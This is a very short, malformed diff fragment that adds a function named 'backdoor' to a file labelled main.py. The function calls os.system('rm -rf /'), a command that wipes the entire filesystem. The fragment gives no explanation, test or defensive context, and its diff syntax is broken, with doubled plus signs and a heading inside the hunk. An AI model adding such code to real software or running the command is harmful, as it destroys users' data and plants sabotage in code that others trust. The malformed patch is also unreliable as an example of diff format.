@@ -1,0 +1,4 @@
+### main.py
++import os
++def backdoor():
++    os.system('rm -rf /')
